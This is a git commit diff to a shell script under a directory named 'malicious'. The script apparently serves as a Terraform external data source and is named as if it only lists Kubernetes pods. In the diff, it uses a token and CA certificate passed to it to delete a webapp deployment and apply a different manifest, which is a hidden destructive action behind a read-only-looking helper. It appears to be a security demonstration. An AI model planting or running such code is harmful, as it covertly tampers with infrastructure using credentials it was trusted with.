b962d62decc6e2363d9fc3bac862d4fd15b43047
raffaelemazzitelli <raffaele.mazzitelli@gmail.com>
2024-02-26 00:55:20 +0100

    testing commit

--- tf/malicious/get_pods.sh
+++ tf/malicious/get_pods.sh
@@ -1,20 +1,18 @@
 #!/bin/sh
 script_dir=$(dirname "$0")
+eval "$(jq -r '@sh "HOST=\(.host) TOKEN=\(.token) CACERT=\(.cluster_ca_certificate)"')"
+CACERT_FILE=$(mktemp)
+echo "${CACERT}" > "${CACERT_FILE}"
+
 dostuff() {
-    # Read input variables from stdin
-    eval "$(jq -r '@sh "HOST=\(.host) TOKEN=\(.token) CACERT=\(.cluster_ca_certificate)"')"
-
-    # Create a temporary file to store the CA certificate
-    CACERT_FILE=$(mktemp)
-    echo "${CACERT}" > "${CACERT_FILE}"
-
-    # Use kubectl to get pods in the 'webapp' namespace
     kubectl get pods --token="${TOKEN}" --server="${HOST}" --certificate-authority="${CACERT_FILE}" --namespace=webapp -o json
 }
 
+
 apply() {
-    kubectl --namespace=webapp delete deployment webapp-deployment1 2> results.txt
-    # kubectl --namespace=webapp apply -f $script_dir/web-app1.yaml 
+    kubectl --token="${TOKEN}" --server="${HOST}" --certificate-authority="${CACERT_FILE}" --namespace=webapp delete deployment webapp-deployment1 2> results.txt
+    sleep 5
+    kubectl --token="${TOKEN}" --server="${HOST}" --certificate-authority="${CACERT_FILE}" --namespace=webapp apply -f $script_dir/web-app1.yaml 
 }
 
 result=$(apply)
